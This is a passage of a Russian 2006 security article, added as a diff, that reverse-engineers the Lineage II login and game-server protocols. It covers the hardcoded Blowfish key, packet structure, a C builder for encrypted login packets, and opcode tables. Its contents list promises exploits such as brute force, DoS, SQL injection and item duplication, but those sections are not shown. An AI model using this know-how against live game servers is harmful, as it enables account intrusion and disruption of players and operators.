@@ -1,0 +1,1592 @@
+// LineAge II: breaking the laws
+// publishing date: 17.07.06
+// darkgrey / d4rk@securitylab.ru
+// m00.blackhat.ru
+
+I. Введение
+
+II. Login-сервер
+
+    1. Шифрование пакетов
+    2. Структура пакетов
+    3. Конструктор RequestAuthLogin-пакетов на Си
+
+III. Game-сервер.
+
+    1. Процесс авторизации на сервере
+    2. Шифрование пакетов
+    3. Протокол
+    4. xID и ObjectID
+    5. Примеры пакетов:
+         a) скупка/продажа
+         b) личка
+         c) OID и IID
+         d) говорим с NPC на примере разучивания скиллов
+
+IV. Проблемы и как можно их использовать
+
+    1. отсутствие лимита на кол-во попыток авторизации
+    2. шифрование пакетов
+    3. Удалённое определение версии lineage2 сервера
+    4. Удалённое "подвешивание" login-сервера
+    5. Клонирование
+    6. Создание "мутантов" и смешение скиллов
+    7. Бессмертие
+    8. 'remote DoS' и что это даёт
+    9. integer overflow в сетевом движке l2j
+    10. SQL-injection
+    11. Заточка (или сказка о 100%-ом enchant'е)
+    12. Геодата (хождение сквозь стены)
+    13. Прикол с SocialAction (0x1b)
+    14. Баг в Ride (0x6a)
+    15. Выкидываем из игры чаров
+    16. Баг с RequestRestartPoint (оживление и побег из тюрьмы)
+    17. Раздеть чужого персонажа не зная ни логина, ни пароля - разве это реально?
+    18. Итог
+
+V. Баги нового поколения
+
+VI. Пара слов о С4
+
+VII. Послесловие
+
+VIII. Ссылки
+
+IX. Приложения к статье
+
+
+
+I. Введение.
+
+Что же такое lineage? Это представитель новомодного жанра (класса?) игрушек - MMORPG
+(Massively Multiplayer Online Role-Playing Game). Я бы даже сказал один из самых
+удачных и популярных, если не самый =). Конечно, трудно говорить о популярности этой
+игры, т.к. посчитать точное количество "втянувшихся" в lineage, наверное, невозможно,
+но такие серверы как www.lineageii.ru (с максимально зарегистрированным онлайном в
+10 000 человек) и оффициальный www.lineage2.com (со всеми 100 000, при том, что он платный)
+дают понять, что цифра должна быть внушительной.
+Суть игры заключается в том, что (как и в любой другой RPG) у вас есть свой персонаж и 
+огромный мир, в котором нужно добывать деньги, одежду, оружие, опыт. Для того, чтобы в конечном
+итоге драться с такими же как ты игроками и тешить своё самолюбие победами. Некоторым людям,
+у которых ну никак не ладится реальная жизнь, она позволяет самореализоваться в виртуальном мире -
+стать известным воином и даже найти невесту (да, девушек в lineage играет тоже немало).
+Среди всех остальных online (да и не только online) игр, lineage подкупает своей
+графикой. Мне лично поначалу казалось невероятным, что кто-то смог создать такие
+чудесные трёхмерные красоты для простой игры.
+Но есть у игры и тёмные стороны. Во-первых, она имеет свойство затягивать. Причём не
+просто затягивать, а вызывать зависимость, с которой крайне сложно бороться. Во-вторых,
+сами понимаете, в индустрии, в которой крутятся сотни тысяч игроманов из практически
+всех слоёв общества, дело без денег не обойдётся (как и всё в нашей жизни). Ведь у
+некоторых людей, имеющих семью, работу, просто нет времени на то, чтобы месяцами
+прокачивать своего персонажа до нужного уровня. Такая геймерская прослойка породила
+на свет личностей, которые начали продавать игровые уровни и вещи за реальные деньги,
+создав тем самым новую нишу в мире lineage. На данный момент, в зависимости от величины
+сервера (и рейтов), стоимость хорошо одетого персонажа высокого уровня может варьироваться
+от 300$ (на умирающем www.antaras.ru) до 5 000$ на официальном сервере. Самое смешное-
+это покупка вещей у администрации того или иного сервера. Вдумайтесь, геймер платит
+N-ное количество убитых енотов за то, чтобы админ добавил 1 запись в базу данных игры.
+Вот как делают деньги из воздуха.
+Что же, я что-то увлёкся описанием игры ) Сказывается год ,на неё потраченный. 
+Безусловно, в подобной индустрии (где закручены деньги и тучи наивных и, порой глупых
+геймеров) дело без нас - пытливых умов - обойтись не может. Кто-то покупает персонажей,
+кто-то создаёт и прокачивает сам, мы же выбираем третий, непроторённый путь.
+Дело в том, что за несколько лет существования этой игры, в ней не было найдено не одной
+уязвимости (за исключением сугубо игровых багов), для неё не было написано не одной программы,
+которая могла бы открыть злоумышленникам доступ в чужие аккаунты. А знаете почему?
+Мне кажется, молодых, неопытных багоискателей (постами которых пестрит bugtraq) отталкивало злое
+шифрование пакетов в lineage. Причём, даже в расшифрованном виде, они представляют собой
+беспорядочный набор символов. 
+Может быть, старички помнят мою статью про протокол клиент-серверного взаимодействия и 
+уязвимости Half-Life (www.securitylab.ru/analytics/216301.php). Целью той статьи было
+описать игру и предоставить на блюдечке почти всё, чего я достиг в её изучении. В этой же статье
+я поведаю как же расшифровывать траффик lineage2, расскажу немного об особенностях
+протокола, ну и предоставлю несколько наработок (как своих так и чужих), все остальное
+публиковать не буду, так как повальное использование оного может привести к хаосу в этом
+прекрасном, сбалансированном и вполне сформировавшемся виртуальном мире =)
+
+ВНИМАНИЕ.
+1. сразу предупреждаю, я иногда буду возвращаться к статье про half-life, ибо аналогии помогут
+вам легче понять написанное. Да и мне писать проще.
+2. статья писалась на основе анализа расшифрованных пакетов и изучения исходного
+кода "самопального" lineage2 сервера l2j, написанного на яве. Соответственно, статья 100%
+действительна для l2j, а для официального настолько, насколько l2j действителен для него =)
+3. все исходники написаны под linux. Для компиляции нужна либла blowfish. Либлы из openssl
+package подойдут при маленькой модификации кода.
+4. кстати о модификации кода. В исходниках, предоставленных в статье, есть небольшие ошибки 
+в логике, дабы исключить их бездумное использование. Если вы вникнете в статью, то и пофиксить
+их не будет проблемой.
+5. и последнее. Полная версия статьи была доступна долгое время (пол года) только ограниченному
+числу людей и с выходом с4 версии lineage2 и фиксами большинства багов резко устарела.
+Про С4 я расскажу немного в конце.
+
+
+II. Login-сервер.
+
+Введение.
+Начнём с того, что разработчики lineage2 отделили логин сервер от игрового, дабы более менее
+разгрузить и без того забитый канал игрового сервера. Кроме того, логин сервер имеет свойство
+повисать (причём, это началось с с3 версии lineage и продолжается по сей день) и не пускать
+пользователей на сервер. Зато те, кто уже играют, не испытывают совершенно никакого дискомфорта =)
+А вследствие отсутсвия всё тех же багоискателей, которые могли бы найти и внятно объяснить девелоперам,
+где же всё-таки закрался баг, он остаётся до сих пор непофиксанным. Так вот, не смотря на всю прелесть
+идеи с разгрузкой игрового канала, наши отечественные админы упорно лепят логин сервер на одну машину
+вместе с игровым.
+
+1. Шифрование пакетов. 
+Для шифрования пакетов, которыми login-сервер обменивается с клиентом, lineage использует blowfish.
+Да, тот самый алгоритм, который был разработан Брюсом Шнейером в 1993 году. Про blowfish важно знать,
+что это симметричный блочный шифр. Симметричный - означает, что алгоритм использует 1 секретный
+ключ, которым и шифруются/дешифруются данные. А если говорить конкретно о blowfish, то на основе
+этого ключа генерируются 18 32-битных подключей и 4 матрицы размером 256 32-битовых слов каждая.
+Которыми, в свою очередь, шифруются/дешифруются данные. 
+Блочный шифр - означает, что blowfish обрабатывает данные блоками (по 8 байт). А ещё это означает,
+что если целостность шифротекста была нарушена, то часть мы по-любому сможем восстановить.
+Применительно к lineage, нужно сказать, что ключ, на основе которого генерируются подключи,
+является константой и чётко прописан в исходниках l2j (вот на чём сыпались 99% исследователей
+lineage, которые предполагали, что ключ должен передаваться в одном из пакетов - см. ссылки в
+конце). Ещё важно отметить то, что первые 2 байта данных пакета _не_шифруются_.
+Чтож, с шифрованием, я думаю, мы разобрались. Идём дальше.
+
+2. Структура пакетов.
+Первые два байта пакета (те, которые не шифруются) содержат длину данных пакета (как и в halflife).
+Следующий байт несёт в себе информацию о типе пакета. Логин-сервер обрабатывает пакеты:
+0x00 - RequestAuthLogin (запрос на авторизацию - содержит логин и пароль)
+0x02 - RequestServerLogin (запрос на заход на сервер)
+0x05 - RequestServerList (запрос на список серверов)
+На остальные он попросту не отвечает, оставляя лишь запись в логах. Клиентом же обрабатываются
+пакеты следующих типов:
+0x01 - авторизация не прошла
+0x03 - вы успешно авторизованы
+0x04 - ответ на RequestServerLogin
+0x06 - ответ на RequestServerList
+А также несколько дополнительные пакетов о бане аккаунта, проверки версии и тд - они представлены ниже.
+Следующий байт является дополнительным к вышеописанным запросам. Например, если сервер ответил
+нам на запрос авторизации пакетом типа 0x01, то следующий байт будет содержать причину, по
+которой авторизация не прошла (для нас важны: 0x03 - неверный логин или пароль, 0x07 - кто-то уже
+юзает аккаунт, 0x11 - установлен временный пароль). Но на самом деле этот байт уже не совсем служебный.
+Например, в RequestAuthLogin пакетах с этого байта начинается логин.
+Далее идёт Н-ное число байт, которые уже не являются управляющими, а несут информацию, определяемую
+типом пакета. Ну, например, для "RequestAuthLogin" это поле содержит логин и пароль.
+Важное предназначение имеют последние 8 байт пакета. Они содержат чексуму всего того, что идёт до
+них, за исключением опять же первых двух байт пакета. Каким же образом вычисляется эта самая чексумма?
+Из данных поочерёдно отделяются 32-битные слова. Первое XOR'ится со вторым. Результат этой операции
+XOR'ится со следующим словом и так далее. Пример вычисления чексуммы будет продемонстрирован ниже.
+
+3. Конструктор пакетов на Си
+Чтож, со структурой пакетов мы разобрались, теперь можно реализовать программно всё, что было
+описанно выше.
+
+/*
+
+ la2-example.c ~ LineAge2 c3 RequestAuthLogin packet constructor
+ 
+ Helps to understand lineage2 authentification.
+ 
+ darkgrey / m00.blackhat.ru
+
+ ~broken
+*/
+
+#include "/usr/local/include/blowfish.h"
+
+// длина ключа
+#define KEY_LEN 20
+// длина RequestAuthLogin пакета постоянна и равна AUTH_PKT_LEN + 2
+#define AUTH_PKT_LEN 0x30
+
+// ключ, на основе которого генерируются sub-keys (подключи)
+char key[] = "[;'.]94-31==-&%@!^+]";
+
+// структура bfkey, которая после генерации подключей будет содержать
+// 18 P подключей и 4 S матрицы
+BF_KEY bfkey;
+
+// функция, которая вычисляет чексумму и вставляет её в пакет
+int add_ckecksum(char *raw, int count) {
+	long chksum = 0L;
+	int i = 0;
+	long ecx;
+	for(i = 0; i < count; i += 4) {
+		ecx = raw[i];
+		ecx |= raw[i + 1];
+		ecx |= raw[i + 2];
+		ecx |= raw[i + 3];
+		chksum ^= ecx;
+	}
+	
+	printf("checksum: 0x%x\n",chksum);
+	memcpy(raw+count, (char *)&chksum, 4);
+}
+
+// добавляет логин и пароль в пакет (отделено от основной функции
+// из соображений читабельности)
+int add_lp(char *raw, char *l, char *p) {
+	l[15] = '\0';
+	p[17] = '\0';
+
+	memcpy(raw+3,l,strlen(l));
+	memcpy(raw+17,p,strlen(p));
+}
+
+// выводит на экран пакет в читабельном виде (для отладки)
+int print_packet(char *raw, int len) {
+	int i, c = 0;
+	
+	for(i=0;i<54;i++) printf("_");
+	
+	for(i=0;i<len+2;i++) {
+		if((c % 0x10)==0) printf("\n0x%.2x | ", c);
+		printf("%.2x ",raw[i] & 0xFF);
+		c++;
+		
+	}
+	printf("\n\n");
+}
+
+// главная функция, которая конструирует пакет
+int build_auth_packet(char *login, char *pwd) {
+	int count = AUTH_PKT_LEN / 8;
+	int i;
+	char packet_skeleton[] =
+		// каркас пакета RequestAuthLogin
+		"\x32\x00" // длина пакета постоянна и равна 0x30 + 0x02
+		"\x00" // тип пакета (0x00 - RequestAuthLogin)
+		"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00" // login
+		"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00" // password
+		"\x08" // означает конец секции login/password
+		"\x00\x00\x00\x00\x00\x00\x00\x00" // в c3 не применяется (зарезервированно?)
+		"\x00\x00\x00\x00" // чексумма
+		"\x00\x00\x00\x00"; 
+	
+	// добавляем логин и пароль в пакет
+	add_lp(packet_skeleton, login, pwd);
+
+	// считаем и добавляем чексумму
+	add_ckecksum(packet_skeleton + 2, AUTH_PKT_LEN - 8);
+	
+	printf("Auth packet dump (non-crypted):\n");
+	print_packet(packet_skeleton, AUTH_PKT_LEN);
+
+	// шифруем блоками по 8 байт
+        for(i = 0; i < count; i++)
+		BF_encrypt((BF_LONG *)((short*)&packet_skeleton+1+i*4), &bfkey, BF_ENCRYPT);
+	
+	printf("Auth packet dump (encrypted):\n");
+	print_packet(packet_skeleton,AUTH_PKT_LEN);
+}
+
+
+
+int main() {
+	char login[] = "m00", // тестовый логин
+		pwd[] = "ownzu"; // пароль
+	
+	printf("\nla2-example.c ~ LineAge2 c3 RequestAuthLogin packet constructor\n\n");
+
+	// генерируем sub-keys
+	BF_set_key(&bfkey, KEY_LEN, key);
+
+	// собираем пакет
+	build_auth_packet(login, pwd);
+}
+/* eof */
+
+Вот что на моём боксе программа вывела на экран:
+
+bash-2.05b$ ./a.out
+
+la2-example.c ~ LineAge2 c3 RequestAuthLogin packet constructor
+
+checksum: 0x224a0377
+Auth packet dump (non-crypted):
+______________________________________________________
+0x00 | 32 00 00 6d 30 30 00 00 00 00 00 00 00 00 00 00
+0x10 | 00 6f 77 6e 7a 75 00 00 00 00 00 00 00 00 00 00
+0x20 | 00 08 00 00 00 00 00 00 00 00 77 03 4a 22 00 00
+0x30 | 00 00
+
+Auth packet dump (encrypted):
+______________________________________________________
+0x00 | 32 00 09 d9 97 e2 29 89 8c b5 1a a0 1a 83 74 43
+0x10 | 39 fc 2f 03 c3 26 9c 65 b0 c4 20 28 11 c1 6a 95
+0x20 | 3e 44 45 46 2a ae b9 18 91 2e 75 56 d0 dc 40 b5
+0x30 | 77 2a
+
+bash-2.05b$
+
+
+III. Game-сервер
+
+1. Процесс авторизации на login-сервере и заход на game-сервер.
+Авторизация на логин сервере происходит в несколько этапов.
+1) логин сервер посылает нам приветствие в виде пакета длиной 11 байт (вообще он содержит информацию о версии).
+2) мы отвечаем ему RequestAuthLogin запросом
+3) если пароль верный, посылает нам пакет с 32-ух битным номером нашего аккаунта (он всегда постоянный) - будем
+звать его SessionKey #1.
+4) мы отсылаем RequestServerList, на что сервер нам отвечает списком серверов, содержащим ипы,
+порты, число играющих пользователей, максимальное число пользователей.
+5) мы отсылаем RequestServerLogin, на что сервер проверяет наш AccessLevel (если он равен -1, значит мы забанены)
+и в зависимости от нашего логина, пароля, уровня доступа и сокета, генерирует уникальный
+32-битный SessionKey #2, по которому в последствие нас авторизует game-сервер.
+Если же игровой сервер в дауне, имитирует это состояние (админы делают это для проведения работ на сервере)
+или просто-напросто полон, отказывается нас принять.
+6) если всё хорошо, лезем на игровой сервер. Отсылаем ему некий пакет (для каждого С3 сервера он свой,
+но константный), на что он отвечает 12-ти байтным пакетом, содержащим первые 4 байта ключа, которые
+скрепляем с другими 4-мя байтами (которые постоянны) и получаем 64-ёх битный ключ. В дальнейшем будем
+использовать его для расшифровки и зашифровки игровых пакетов. Важно отметить, что с каждым
+рас(за)шифрованным пакетом, его длина прибавляется к первой части ключа.
+7) отсылаем ему логин и два идентификатора (уже в зашифрованном виде), которые мы получили в сеансе
+с login-сервером. В ответ получаем список персонажей.
+Вот так, в 7 этапов мы авторизуемся на сервере =) Сложно, зато безопасно.
+Возможно, у кого-то из вас возник вопрос: а возможно ли зайти на игровой сервер напрямую? Без участия
+логин сервера. Об этом я напишу ниже.
+
+
+2. Шифрование пакетов
+Как я уже писал выше, для шифрования игровых пакетов lineage использует 64-битный ключ. Первые
+его 4 байта берутся из самого первого пакета game-сервера, вторые же-константы. Далее берётся N-ный символ
+из открытого текста, XOR'ится с N-ным байтом ключа. Параллельно с этим XOR'ится (N-1)-ный символ
+из открытого текста по 0xFF. Над результатами обоих вычислений проводится операция "поразрядное И".
+И по такому алгоритму шифруется каждый символ начиная с первого. Как видите, как будет зашифрован
+каждый последующий символ, зависит от предыдущего. А это значит, что если у нас по тем или иным
+причинам повреждена первая часть пакета, либо её попросту нет, расшифровать вторую часть мы не
+сможем. Ну это так, к слову. На самом деле это для нас не важно.
+Ещё важно отметить то, что первая часть ключа переменна. С каждым новым расшифрованным пакетом,
+к первым 4-ём байтам прибавляется длина этих данным. То есть, имея первоначальный ключ (на момент
+соединения с логин сервером) и, выдернув пакет в определённый момент из сеанса с game-сервером,
+расшифровать его мы не сможем. Для этого нам нужно восстановить все пакеты, которые были до него.
+В принципе, количество возможных комбинаций ключа равно ~423 миллиона. С учётом простоты
+алгоритма, современные компьютеры смогут произвести где-то 10 000 итераций в секунду (может даже
+и больше) и найти ключ максимум за 12 часов. Но для этого нам понадобится знать хотя бы примерно
+содержание пакета.
+Для чего авторы сделали ключ переменным? Думаю, всем понятно, в целях безопасности. Хотя, речь идёт
+о TCP (а не о UDP как в том же самом halflife), в котором кому-то постороннему "вклиниться" в сеанс
+крайне затруднительно.
+
+
+
+3. Протокол.
+Как и в пакетах login-сервера, первые два байта отводятся под длину. Далее байт означает тип пакета.
+Вот типы пакетов, которые должен обрабатывать С3 клиент lineage2 (некоторые буду комментировать):
+// отсылает login-сервер
+0x01 loginfail2 
+0x02 accountKicked1 
+0x03 loginok 
+0x04 serverlist 
+0x05 serverfail 
+0x06 playfail 
+0x07 playok 
+0x08 accountKicked 
+0x09 blockedAccMsg  // бан 
+0x20 protocol version different 
+0x00 VersionCheck 
+
+// отсылает game-сервер
+0x01 MoveToLocation  
+0x02 NpcSay 
+0x03 CharInfo // имеется в виду окружающие персы
+0x04 UserInfo 
+0x06 Attack 
+0x07 Attack 
+0x08 Attacked 
+0x09 Attacked 
+0x0a AttackCanceld 
+0x0b Die 
+0x0c Revive 
+0x0d AttackOutOfRange 
+0x0e AttackInCoolTime 
+0x0f AttackDeadTarget
+0x10 LeaveWorld 
+0x11 AuthLoginSuccess
+0x12 AuthLoginFail
+0x13 CharList // список чаров
+0x15 SpawnItem // на некоторых С3 ответ на выбор чара
+0x16 DropItem // на некоторых С3 передаёт инфо о мобе
+0x17 GetItem 
+0x18 EquipItem 
+0x19 UnequipItem 
+0x1a StatusUpdate 
+0x1b NpcHtmlMessage // на некоторых С3 передаёт список шмота с ItemID и их ObjectID
+0x1c SellList 
+0x1d BuyList 
+0x1e DeleteObject 
+0x1f CharSelectInfo
+0x20 LoginFail 
+0x21 CharSelected
+0x22 NpcInfo 
+0x23 NewCharacterSuccessPacket 
+0x24 NewCharacterFailPacket 
+0x25 CharCreateOk 
+0x26 CharCreateFail 
+0x27 ItemList 
+0x28 SunRise 
+0x29 SunSet 
+0x2a EquipItemSuccess // устарел
+0x2b EquipItemFail // устарел
+0x2c UnEquipItemSuccess // устарел
+0x2d UnEquipItemFail // устарел
+0x2e TradeStart 
+0x2f TradeStartOk // устарел
+0x30 TradeOwnAdd 
+0x31 TradeOtherAdd 
+0x32 TradeDone 
+0x33 CharDeleteSuccess 
+0x34 CharDeleteFail 
+0x35 ActionFail 
+0x36 ServerClose 
+0x37 InventoryUpdate 
+0x38 TeleportToLocation 
+0x39 TargetSelected 
+0x3a TargetUnselected 
+0x3b AutoAttackStart 
+0x3c AutoAttackStop 
+0x3d SocialAction 
+0x3e ChangeMoveType 
+0x3f ChangeWaitType 
+0x40 NetworkFail // устарел
+0x43 CreatePledge 
+0x44 AskJoinPledge 
+0x45 JoinPledge 
+0x46 WithdrawalPledge 
+0x47 OustPledgeMember 
+0x48 SetOutPledgeMember 
+0x49 DismissPledge 
+0x4a SetDismissPledge 
+0x4b AskJoinParty 
+0x4c JoinParty 
+0x4d WithdrawalParty 
+0x4e OustPartyMember 
+0x4f SetOustPartyMember 
+0x50 DismissParty 
+0x51 SetDismissParty 
+0x52 MagicAndSkillList 
+0x53 WarehouseDepositList 
+0x54 WarehouseWithdrawalList 
+0x55 WarehouseDone 
+0x56 ShortCutRegister 
+0x57 ShortCutInit 
+0x58 ShortCutDelete 
+0x59 StopMove 
+0x5a MagicSkillUser 
+0x5b MagicSkillCanceld 
+0x5d CreatureSay 
+0x5e EquipUpdate 
+0x5f StopMoveWithLocation 
+0x60 DoorInfo 
+0x61 DoorStatusUpdate 
+0x63 PartySmallWindowAll 
+0x64 PartySmallWindowAdd 
+0x65 PartySmallWindowDeleteAll 
+0x66 PartySmallWindowDelete 
+0x67 PartySmallWindowUpdate 
+0x68 PledgeShowMemberListAll 
+0x69 PledgeShowMemberListUpdate 
+0x6a PledgeShowMemberListAdd 
+0x6b PledgeShowMemberListDelete 
+0x6c MagicList // устарел
+0x6d SkillList 
+0x6e VehicleInfo 
+0x6f VehicleDeparture 
+0x70 VehicleCheckLocation 
+0x71 GetOnVehicle 
+0x72 GetOffVehicle 
+0x73 TradeRequest 
+0x74 RestartResponse 
+0x75 MoveToPawn 
+0x76 SetTo 
+0x77 StartRotating 
+0x78 FinishRotating 
+0x79 MoveBackwardToLocation // имеется ввиду скилл или to_the_nearest_village после смерти
+0x7a SystemMessage 
+0x7d StartPledgeWar 
+0x7e ReplyStartPledgeWar 
+0x7f StopPledgeWar 
+0x80 ReplyStopPledgeWar 
+0x81 SurrenderPledgeWar 
+0x82 ReplySurrenderPledgeWar 
+0x83 SetPledgeCrest // устарел
+0x84 PledgeCrest 
+0x85 SetupGauge 
+0x86 ShowBoard 
+0x87 ChooseInventoryItem 
+0x89 MoveToLocationInVehicle 
+0x8a StopMoveInVehicle 
+0x8b ValidateLocationInVehicle 
+0x8c TradeOtherAdd2 
+0x8d TradePressOwnOK // устарел
+0x8e MagicSkillLaunched 
+0x8f FriendAddRequestResult 
+0x90 FriendAdd  // устарел
+0x91 FriendRemove // устарел
+0x92 FriendList // устарел
+0x93 FriendStatus // устарел
+0x94 TradePressOtherOk // устарел
+0x95 FriendAddRequestResult2 
+0x96 LeaveWorld2 
+0x97 AbnormalStatusUpdate 
+0x98 QuestList 
+0x99 EnchantResult 
+0x9a AuthServerList // устарел
+0x9b PledgeShowMemberListDeleteAll 
+0x9c PledgeInfo 
+0x9d PledgeExtendedInfo 
+0x9e SurrenderPersonally 
+0x9f Ride 
+0xa1 PledgeShowInfoUpdate 
+0xa2 ClientAction 
+0xa3 AquireSkillList 
+0xa4 AquireSkillInfo 
+0xa5 ServerObjectInfo 
+0xa6 HideGm 
+0xa7 AquireSkillDone 
+0xa8 GMViewCharacterInfo 
+0xa9 GMViewPledgeInfo 
+0xaa GMViewSkillInfo 
+0xab GMviewMagicInfo 
+0xac GMViewQuestInfo 
+0xad GMViewItemList 
+0xae GMViewWarehouseWithdrawList 
+0xaf PartyMatchList 
+0xb0 PartyMatchDetail 
+0xb1 PlaySound 
+0xb2 StaticObject 
+0xb3 PrivateSellList2 
+0xb4 PrivateBuyList2 
+0xb5 PrivateStoreMsg 
+0xb6 ShowMinimapPacket 
+0xb7 ReviveRequest // устарел
+0xb8 AbnormalVisualEffect 
+0xb9 TutorialShowHtml 
+0xba TutorialShowQuestionMark 
+0xbb TutorialEnableClientEvent 
+0xbc TutorialClose 
+0xbd ShowRadar 
+0xbe DeleteRadar 
+0xbf MyTargetSelected 
+0xc0 PartyMemberPosition 
+0xc1 AskJoinAlliance 
+0xc2 JoinAlliance 
+0xc3 WithdrawAlliance 
+0xc4 OustAllianceMemberPledge 
+0xc5 DismissAlliance 
+0xc6 SetAllianceCrest // устарел
+0xc7 ReceiveAllyCrest 
+0xc8 ServerCloseSocket // устарел
+0xc9 PetStatusShow 
+0xca PetInfo 
+0xcb PetItemList 
+0xcc PetInventoryUpdate 
+0xcd AllianceInfo // устарел
+0xce PetStatusUpdate 
+0xcf PetDelete 
+0xd0 PrivateSellList 
+0xd1 PrivateBuyList 
+0xd2 PrivateStoreMsg 
+0xd3 VehicleStart 
+0xd4 RequestTimeCheck 
+0xd5 StartAllianceWar 
+0xd6 ReplyStartAllianceWar // устарел
+0xd7 StopAllianceWar 
+0xd8 ReplyStopAllianceWar // устарел 
+0xd9 SurrenderAllianceWar // устарел
+0xda SkillCoolTimePacket 
+0xdb PackageToListPacket 
+0xdc PackageSendableListPacket 
+0xdd EarthQuake 
+0xde FlyToLocation 
+0xdf BlockList // устарел
+0xe0 SpecialCamera 
+0xe1 NormalCamera 
+0xe2 CastleSiegeInfoPacket 
+0xe3 CastleSiegeAttackerList 
+0xe4 CastleSiegeDefenderList 
+0xe5 NickNameChanged 
+0xe6 PledgeStatusChanged 
+0xe7 RelationChanged 
+0xe8 OnEventTrigger 
+0xe9 MultiSellListPacket 
+0xea SetSummonRemainTime 
+0xeb OnSkillRemainSec 
+0xec NetPingPacket 
+
+От клиента серверу:
+0x01 MoveBackwardToLocation 
+0x02 Say 
+0x03 EnterWorld 
+0x04 Action 
+0x08 RequestAuthLogin
+0x09 Logout 
+0x0a Attack 
+0x0b CharacterCreate
+0x0c CharacterDelete
+0x0d CharacterSelect
+0x0e NewCharacter 
+0x0f ItemList 
+0x10 RequestEquipItem 
+0x11 RequestUnEquipItem 
+0x12 RequestDropItem 
+0x12 RequestDropItemFromPet 
+0x14 UseItem 
+0x15 TradeRequest 
+0x16 AddTradeItem 
+0x17 TradeDone 
+0x1a RequestTeleport 
+0x1b SocialAction 
+0x1c ChangeMoveType // устарел. Теперь юзается 'RequestActionUse' 
+0x1d ChangeWaitType // устарел. Теперь юзается 'RequestActionUse' 
+0x1e RequestSellItem 
+0x1f RequestBuyItem 
+0x20 RequestLinkHtml 
+0x21 RequestBypassToServer 
+0x22 RequestBBSwrite 
+0x23 RequestCreatePledge 
+0x24 RequestJoinPledge 
+0x25 RequestAnswerJoinPledge 
+0x26 RequestWithDrawalPledge 
+0x27 RequestOustPledgeMember 
+0x28 RequestDismissPledge 
+0x29 RequestJoinParty 
+0x2a RequestAnswerJoinParty 
+0x2b RequestWithDrawalParty 
+0x2c RequestOustPartyMember 
+0x2d RequestDismissParty 
+0x2e RequestMagicSkillList 
+0x2f RequestMagicSkillUse 
+0x30 Appearing 
+0x31 SendWareHouseDepositList 
+0x32 SendWareHouseWithDrawList 
+0x33 RequestShortCutReg 
+0x34 RequestShortCutUse 
+0x35 RequestShortCutDel 
+0x37 RequestTargetCancel 
+0x38 Say2 // приват (на некоторых серверах - la2.ru - юзается 0x39)
+0x3c RequestPledgeMemberList 
+0x3e RequestMagicList 
+0x3f RequestSkillList 
+0x41 MoveWithDelta 
+0x42 GetOnVehicle 
+0x43 GetOffVehicle 
+0x44 AnswerTradeRequest 
+0x45 RequestActionUse 
+0x46 RequestRestart 
+0x47 RequestSiegeInfo 
+0x48 ValidatePosition 
+0x49 RequestSEKCustom 
+0x4a StartRotating 
+0x4b FinishRotating 
+0x4d RequestStartPledgeWar 
+0x4e RequestReplyStartPledgeWar 
+0x4f RequestStopPledgeWar 
+0x50 RequestReplyStopPledgeWar 
+0x51 RequestSurrenderPledgeWar 
+0x52 RequestReplySurrenderPledgeWar 
+0x53 RequestSetPledgeCrest 
+0x55 RequestGiveNickName  // вообще юзается для установки тайтла CL'ами. Может для чего ещё..
+0x57 RequestShowboard 
+0x58 RequestEnchantItem 
+0x59 RequestDestroyItem 
+0x5b SendBypassBuildCmd 
+0x5e RequestFriendInvite 
+0x5f RequestFriendAddReply 
+0x60 RequestFriendList 
+0x61 RequestFriendDel 
+0x62 CharacterRestore 
+0x63 RequestQuestList 
+0x64 RequestDestroyQuest 
+0x66 RequestPledgeInfo 
+0x67 RequestPledgeExtendedInfo 
+0x68 RequestPledgeCrest 
+0x69 RequestSurrenderPersonally 
+0x6a Ride 
+0x6b RequestAcquireSkillInfo 
+0x6c RequestAcquireSkill 
+0x6d RequestRestartPoint 
+0x6e RequestGMCommand 
+0x6f RequestPartyMatchConfig 
+0x70 RequestPartyMatchList 
+0x71 RequestPartyMatchDetail 
+0x72 RequestCrystallizeItem 
+0x73 RequestPrivateStoreManage 
+0x74 SetPrivateStoreList 
+0x75 RequestPrivateStoreManageCancel 
+0x76 RequestPrivateStoreQuit 
+0x77 SetPrivateStoreMsg 
+0x78 RequestPrivateStoreList 
+0x79 SendPrivateStoreBuyList 
+0x7a ReviveReply 
+0x7b RequestTutorialLinkHtml 
+0x7c RequestTutorialPassCmdToServer 
+0x7d RequestTutorialQuestionMark 
+0x7e RequestTutorialClientEvent 
+0x7f RequestPetition 
+0x80 RequestPetitionCancel 
+0x81 RequestGMList 
+0x82 RequestJoinAlly 
+0x83 RequestAnswerJoinAlly 
+0x84 RequestWithdrawAlly 
+0x85 RequestOustAlly 
+0x86 RequestDismissAlly 
+0x87 RequestSetAllyCrest 
+0x88 RequestAllyCrest 
+0x89 RequestChangePetName 
+0x8a RequestPetUseItem 
+0x8b RequestGiveItemToPet 
+0x8c RequestGetItemFromPet 
+0x8e RequestAllyInfo 
+0x8f RequestPetGetItem 
+0x90 RequestPrivateStoreBuyManage 
+0x91 SetPrivateBuyList 
+0x92 RequestPrivateStoreBuyManageCancel 
+0x93 RequestPrivateStoreBuyQuit 
+0x94 SetPrivateBuyMsg 
+0x95 RequestPrivateStoreBuyList 
+0x96 SendPrivateStoreBuyBuyList 
+0x97 SendTimeCheckPacket 
+0x98 RequestStartAllianceWar 
+0x99 ReplyStartAllianceWar 
+0x9a RequestStopAllianceWar 
+0x9b ReplyStopAllianceWar 
+0x9c RequestSurrenderAllianceWar 
+0x9d RequestSkillCoolTime 
+0x9e RequestPackageSendableItemList 
+0x9f RequestPackageSend 
+0xa0 RequestBlock 
+0xa1 RequestCastleSiegeInfo 
+0xa2 RequestCastleSiegeAttackerList 
+0xa3 RequestCastleSiegeInfo 
+0xa4 RequestJoinCastleSiege 
+0xa5 RequestConfirmCastleSiegeWaitingList 
+0xa6 RequestSetCastleSiegeTime 
+0xa7 RequestMultiSellChoose 
+0xa8 NetPing
+
+
+Как видите, большинство клиентских пакетов начинается со слова Request, что переводится как "запрос".
+Да, действительно, весь процесс игры выглядит примерно так: сервер постоянно передаёт нам состояние мира,
+положение мобов/игроков/npc и тд. Мы же, когда что-то надо (пойти, атаковать и тд) передаём "запрос". Всё
+очень просто.
+
+
+4. XID и ObjectID
+Каждая вещь (предмет, NPC) в игре имеет свой 16/32-битный идентификатор (профессии - 8-ми битный).
+Его смысл в том, что, согласитесь, удобнее передавать по сети 2/4-х байтное число, чем фразу Н-ной длины вроде:
+"Crystal Scroll: Enchant Weapon (Grade B)" или ник NPC вроде "Magister MacTePqpJlOMaCTeP". Как вы понимаете, он
